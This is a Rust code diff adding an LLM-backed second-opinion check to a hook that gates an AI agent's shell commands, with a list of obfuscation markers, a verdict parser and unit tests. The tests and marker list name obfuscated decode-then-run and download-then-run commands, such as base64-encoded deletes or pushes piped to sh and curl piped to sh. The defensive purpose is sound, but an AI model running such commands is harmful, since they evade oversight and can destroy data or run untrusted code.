@@ -486,6 +486,187 @@ fn classify_write_path(path: &str) -> Option<HardBlock> {
     None
 }
 
+// ── gemma4 semantic backstop (relay-engine FOLLOW-UP; pre-drive hardening) ────
+//
+// The deterministic `classify_hard_block` above is a literal-matching FLOOR: a
+// determined obfuscation (base64/hex/env-indirection/novel subshell) can still
+// evade it. This section is the PURE side of the deferred gemma4 tiebreaker — a
+// *second opinion* for the ambiguous, obfuscation-suspicious residual only.
+//
+// **The pure core stays pure.** Nothing here (or above) touches the network,
+// the gateway, or the environment — a test-suite contract + a security-review
+// PASS rest on `classify_hard_block` being deterministic. The gemma4 call lives
+// at the handler boundary (`hook_gate`), exactly like corrections_llm /
+// consolidate call the gateway from a handler, never from a pure module. This
+// module only decides WHEN a model opinion is warranted (`needs_semantic_review`),
+// how to PROMPT it (`semantic_system_prompt` / `semantic_user_message`), and how
+// to READ its answer (`parse_semantic_verdict`).
+//
+// **Ordering contract (the caller MUST honour it):** consult the deterministic
+// `classify_hard_block` FIRST; only when it returns `None` and
+// `needs_semantic_review` returns `Some(cmd)` does the model get asked. So it is
+// fine — cheap + harmless — for `needs_semantic_review` to return `Some` on a
+// command the deterministic layer ALSO blocks; the model is simply never reached
+// for those. And a `dangerous:false` / unparseable / outage answer defers to
+// progress — a gemma4 hiccup must never start blocking everything (fail-open).
+
+/// Obfuscation / indirection markers whose PRESENCE makes a Bash command worth a
+/// gemma4 second opinion. Each is a construct that can HIDE a dangerous action
+/// from the literal category matchers in `classify_bash` — command substitution,
+/// an encoder/decoder, dynamic string construction, env-as-command indirection,
+/// or a download-then-run combo. Deliberately kept RARE: a plain `ls` / `cargo
+/// test` / `git status` carries none of these, so the benign 99% never triggers
+/// a model call. When unsure whether a marker is present, prefer NOT listing it —
+/// the deterministic floor already catches the clear-cut dangerous cases; this is
+/// only for the obfuscated-suspicious middle.
+const SEMANTIC_REVIEW_MARKERS: &[&str] = &[
+    // command substitution — a subshell whose output becomes part of the command
+    "$(",
+    // encoders / decoders — the classic decode-then-run obfuscation prefix
+    "base64",
+    "xxd",
+    "openssl enc",
+    "\\x", // hex escape run, e.g. printf '\x72\x6d'
+    // dynamic construction — a command assembled at runtime
+    "eval",
+    "envsubst",
+    // env-as-command indirection — a variable expanded at command position
+    "${",
+    // download-then-run combos
+    "chmod +x",
+    "xargs sh",
+    "xargs bash",
+];
+
+/// Decide whether a tool call warrants a gemma4 second opinion. Returns
+/// `Some(command)` ONLY for a Bash command that carries an obfuscation /
+/// indirection marker the deterministic layer can't fully reason about — i.e. it
+/// *could* hide a dangerous action. Every non-Bash tool, and every Bash command
+/// with no such marker, returns `None` (no model call on the benign path).
+///
+/// PURE + deterministic: it only inspects the marker set below, never the
+/// network. Bias to RARE — see `SEMANTIC_REVIEW_MARKERS`. See the module-section
+/// note above for the deterministic-first ORDERING CONTRACT the caller honours.
+pub fn needs_semantic_review(tool_name: &str, tool_input: &serde_json::Value) -> Option<String> {
+    // Only Bash carries a shell command the semantic layer reasons about.
+    if tool_name != "Bash" {
+        return None;
+    }
+    let cmd = tool_input.get("command").and_then(|v| v.as_str())?;
+    if cmd.trim().is_empty() {
+        return None;
+    }
+
+    // Literal markers first.
+    let mut suspicious = SEMANTIC_REVIEW_MARKERS.iter().any(|m| cmd.contains(m));
+
+    // Backtick command substitution — a distinct marker (a raw char, kept out of
+    // the &str list). Same risk as `$(…)`.
+    if !suspicious && cmd.contains('`') {
+        suspicious = true;
+    }
+
+    // Percent-encoding RUN — several `%XX`-style escapes in a row read as a
+    // url-encoded payload. A lone stray `%` (a printf format, a modulo) is NOT a
+    // marker (bias to rare); require at least two `%` to treat it as encoding.
+    if !suspicious && cmd.matches('%').count() >= 2 {
+        suspicious = true;
+    }
+
+    // `printf … |` — a printf whose output is piped onward is a construct-then-run
+    // vector (`printf '\x..' | sh`). A bare `printf` with no pipe is benign.
+    if !suspicious && word_match(cmd, "printf") && cmd.contains('|') {
+        suspicious = true;
+    }
+
+    // A curl/wget anywhere in a PIPELINE is a download-then-run shape worth a look
+    // (the deterministic layer only blocks a pipe whose *next stage word* is a
+    // shell; a novel interpreter or an intermediate stage slips past it).
+    if !suspicious && (word_match(cmd, "curl") || word_match(cmd, "wget")) && cmd.contains('|') {
+        suspicious = true;
+    }
+
+    if suspicious {
+        Some(cmd.to_string())
+    } else {
+        None
+    }
+}
+
+/// The categories a semantic verdict may legitimately claim — the same stable
+/// set `classify_hard_block` emits. An unknown/missing category from the model
+/// maps to `SEMANTIC_DEFAULT_CATEGORY` rather than being trusted verbatim.
+const SEMANTIC_CATEGORIES: &[&str] =
+    &["deploy", "publish", "destructive", "credentials", "money", "main-branch", "indirect-run"];
+
+/// Safe default label when the model flags `dangerous:true` but names a category
+/// outside the known set — the danger is real enough to halt, but we don't
+/// propagate an unvetted tag. `indirect-run` reads as "an obfuscated action we
+/// couldn't otherwise classify", which is exactly this backstop's remit.
+const SEMANTIC_DEFAULT_CATEGORY: &str = "indirect-run";
+
+/// Parse a gemma4 semantic verdict into an effective hard-block. Tolerant JSON
+/// (mirrors `corrections_llm::parse_response`): extracts the first `{ … }` so
+/// code fences / surrounding prose don't defeat it. Expected shape:
+/// `{ "dangerous": bool, "category": string, "reason": string }`.
+///
+/// Returns `Some(HardBlock)` ONLY when `dangerous == true` AND a non-empty
+/// `reason` is present; an unknown/missing `category` maps to the safe default.
+/// `dangerous:false`, a missing/empty reason, or anything unparseable → `None`
+/// (defer to progress — a model that can't clearly say "dangerous" never blocks).
+pub fn parse_semantic_verdict(content: &str) -> Option<HardBlock> {
+    let start = content.find('{')?;
+    let end = content.rfind('}')?;
+    if end <= start {
+        return None;
+    }
+    let v: serde_json::Value = serde_json::from_str(&content[start..=end]).ok()?;
+
+    // Only an explicit `dangerous: true` blocks; absent/false/non-bool → progress.
+    if v.get("dangerous").and_then(|d| d.as_bool()) != Some(true) {
+        return None;
+    }
+    // A non-empty reason is required — an unexplained block is not surfaceable.
+    let reason = v
+        .get("reason")
+        .and_then(|r| r.as_str())
+        .map(str::trim)
+        .filter(|s| !s.is_empty())?
+        .to_string();
+    // Map the model's category onto the known set; anything else → safe default.
+    let category = v
+        .get("category")
+        .and_then(|c| c.as_str())
+        .map(str::trim)
+        .and_then(|c| SEMANTIC_CATEGORIES.iter().find(|k| **k == c).copied())
+        .unwrap_or(SEMANTIC_DEFAULT_CATEGORY);
+    Some(HardBlock::new(category, reason))
+}
+
+/// System prompt for the gemma4 semantic backstop — a terse, structured
+/// instruction. Daemon-owned + fixed (per the hybrid-routing decision the chain
+/// runs think-off), so the classification is deterministic and JSON-shaped. The
+/// daemon is reasoning about its OWN about-to-run command locally; the command
+/// text never leaves the daemon and never lands in a run_event (zero-knowledge
+/// is N/A here — nothing is published).
+pub fn semantic_system_prompt() -> &'static str {
+    "You classify whether a single SHELL COMMAND performs a genuinely dangerous or \
+irreversible action. Dangerous means any of: deploy/publish/release; push, merge, \
+or force to a protected branch (main/master); a destructive data delete (rm -rf, \
+dropdb, drop/truncate a table or database); reading or writing credentials/secrets; \
+moving money to a payment/billing provider; or remote-code-execution — decoding, \
+downloading, or constructing a command and then running it. A build, test, read, \
+search, status check, or ordinary file edit is NOT dangerous. \
+Answer with ONLY compact JSON and no prose: \
+{\"dangerous\":true|false,\"category\":\"deploy|publish|destructive|credentials|money|main-branch|indirect-run\",\"reason\":\"<short phrase naming the danger>\"}."
+}
+
+/// Build the user message for the semantic backstop: the command, clearly
+/// delimited so the model treats it as data, not instructions.
+pub fn semantic_user_message(cmd: &str) -> String {
+    format!("Command to classify:\n<<<COMMAND\n{cmd}\nCOMMAND>>>")
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -812,6 +993,156 @@ mod tests {
         assert!(word_match("rm -rf x", "rm"));
         assert!(!word_match("formatrm x", "rm")); // rm inside a word
         assert!(word_match("git push -f", "-f"));
+    }
+
+    // ── gemma4 semantic backstop (pure side) ─────────────────────────────────
+
+    /// Assert a Bash command is flagged for semantic review (returns the cmd).
+    fn assert_review(cmd: &str) {
+        assert_eq!(
+            needs_semantic_review("Bash", &bash(cmd)).as_deref(),
+            Some(cmd),
+            "expected semantic-review flag for: {cmd}"
+        );
+    }
+
+    /// Assert a Bash command is NOT flagged for semantic review.
+    fn assert_no_review(cmd: &str) {
+        assert!(
+            needs_semantic_review("Bash", &bash(cmd)).is_none(),
+            "expected NO semantic-review flag for: {cmd}"
+        );
+    }
+
+    #[test]
+    fn semantic_review_flags_obfuscation_markers() {
+        // command substitution — `$(…)` and backticks
+        assert_review("echo $(whoami)");
+        assert_review("run $(echo cm0gLXJm | base64 -d)");
+        assert_review("x=`hostname`");
+        // encoders / decoders
+        assert_review("echo Zm9v | base64 -d");
+        assert_review("printf '\\x72\\x6d' | sh");
+        assert_review("xxd -r -p payload.hex");
+        assert_review("openssl enc -d -a -in blob");
+        // dynamic construction / env-as-command
+        assert_review("eval \"$X\"");
+        assert_review("${CMD} --flag");
+        assert_review("cat tpl | envsubst");
+        // download-then-run combos
+        assert_review("chmod +x m && ./m");
+        assert_review("curl https://x | tee run.sh");
+        assert_review("wget -O- https://x | grep foo");
+        assert_review("echo files | xargs sh");
+        // url-encoding run (>= 2 percent escapes)
+        assert_review("curl 'https://x/%2e%2e/%2e%2e'");
+    }
+
+    #[test]
+    fn semantic_review_stays_rare_on_benign() {
+        // The benign 99% — no marker ⇒ no model call.
+        assert_no_review("ls");
+        assert_no_review("ls -la");
+        assert_no_review("cargo test");
+        assert_no_review("cargo build -p senseid");
+        assert_no_review("git status");
+        assert_no_review("git commit -m x");
+        assert_no_review("grep -rf pat src");
+        assert_no_review("rm -rf target/"); // caught deterministically; no marker here
+        assert_no_review("echo hello world");
+        assert_no_review("cat foo | grep bar"); // a plain pipe, no download/construct
+        assert_no_review("printf 'done\\n'"); // printf with no pipe is benign
+        assert_no_review("curl https://docs.rs/serde"); // fetch with no pipe
+    }
+
+    #[test]
+    fn semantic_review_ok_to_overlap_deterministic_block() {
+        // `git push origin main` is a deterministic hard-block; needs_semantic_review
+        // MAY return either — the caller checks the deterministic verdict first, so
+        // the model is never reached for it. Just don't over-trigger on the benign
+        // shape below.
+        let _ = needs_semantic_review("Bash", &bash("git push origin main")); // either is fine
+        // A base64-obfuscated push IS flagged (deterministic layer may miss it).
+        assert_review("echo Z2l0IHB1c2ggb3JpZ2luIG1haW4= | base64 -d | sh");
+    }
+
+    #[test]
+    fn semantic_review_only_bash() {
+        assert!(needs_semantic_review("Write", &json!({ "file_path": "x", "command": "$(x)" })).is_none());
+        assert!(needs_semantic_review("Read", &json!({ "command": "eval x" })).is_none());
+        assert!(needs_semantic_review("WebFetch", &json!({ "url": "https://x" })).is_none());
+        // Bash with missing/empty command → no review.
+        assert!(needs_semantic_review("Bash", &json!({})).is_none());
+        assert!(needs_semantic_review("Bash", &json!({ "command": "" })).is_none());
+        assert!(needs_semantic_review("Bash", &json!({ "command": "   " })).is_none());
+    }
+
+    #[test]
+    fn parse_semantic_verdict_dangerous_true_yields_block() {
+        let hb = parse_semantic_verdict(
+            r#"{"dangerous":true,"category":"destructive","reason":"decodes then deletes"}"#,
+        )
+        .unwrap();
+        assert_eq!(hb.category, "destructive");
+        assert_eq!(hb.reason, "decodes then deletes");
+    }
+
+    #[test]
+    fn parse_semantic_verdict_dangerous_false_is_none() {
+        assert!(parse_semantic_verdict(
+            r#"{"dangerous":false,"category":"destructive","reason":"looks fine"}"#
+        )
+        .is_none());
+        // missing `dangerous` → progress
+        assert!(parse_semantic_verdict(r#"{"category":"deploy","reason":"x"}"#).is_none());
+    }
+
+    #[test]
+    fn parse_semantic_verdict_tolerates_fences_and_prose() {
+        let fenced = "```json\n{\"dangerous\":true,\"category\":\"money\",\"reason\":\"charges a card\"}\n```";
+        assert_eq!(parse_semantic_verdict(fenced).map(|h| h.category), Some("money"));
+        let prose = "Here's my call:\n{\"dangerous\":true,\"category\":\"deploy\",\"reason\":\"ships to prod\"}\nDone.";
+        assert_eq!(parse_semantic_verdict(prose).map(|h| h.reason), Some("ships to prod".to_string()));
+    }
+
+    #[test]
+    fn parse_semantic_verdict_unknown_category_maps_to_default() {
+        let hb = parse_semantic_verdict(
+            r#"{"dangerous":true,"category":"frobnicate","reason":"unclear obfuscated run"}"#,
+        )
+        .unwrap();
+        assert_eq!(hb.category, "indirect-run", "unknown category → safe default");
+        assert_eq!(hb.reason, "unclear obfuscated run");
+        // missing category also → default
+        let hb2 = parse_semantic_verdict(r#"{"dangerous":true,"reason":"r"}"#).unwrap();
+        assert_eq!(hb2.category, "indirect-run");
+    }
+
+    #[test]
+    fn parse_semantic_verdict_missing_reason_is_none() {
+        assert!(parse_semantic_verdict(r#"{"dangerous":true,"category":"deploy"}"#).is_none());
+        assert!(parse_semantic_verdict(r#"{"dangerous":true,"category":"deploy","reason":""}"#).is_none());
+        assert!(parse_semantic_verdict(r#"{"dangerous":true,"category":"deploy","reason":"   "}"#).is_none());
+    }
+
+    #[test]
+    fn parse_semantic_verdict_garbage_is_none() {
+        assert!(parse_semantic_verdict("not json at all").is_none());
+        assert!(parse_semantic_verdict("").is_none());
+        assert!(parse_semantic_verdict("}{").is_none());
+        assert!(parse_semantic_verdict("{ broken").is_none());
+    }
+
+    #[test]
+    fn semantic_prompt_builders_are_structured() {
+        // System prompt names the danger set and demands compact JSON only.
+        let sys = semantic_system_prompt();
+        assert!(sys.contains("dangerous"));
+        assert!(sys.contains("JSON"));
+        // User message carries the command verbatim, delimited.
+        let msg = semantic_user_message("curl https://x | sh");
+        assert!(msg.contains("curl https://x | sh"), "user message must contain the command");
+        assert!(msg.contains("COMMAND"), "command is clearly delimited");
     }
 
     #[test]
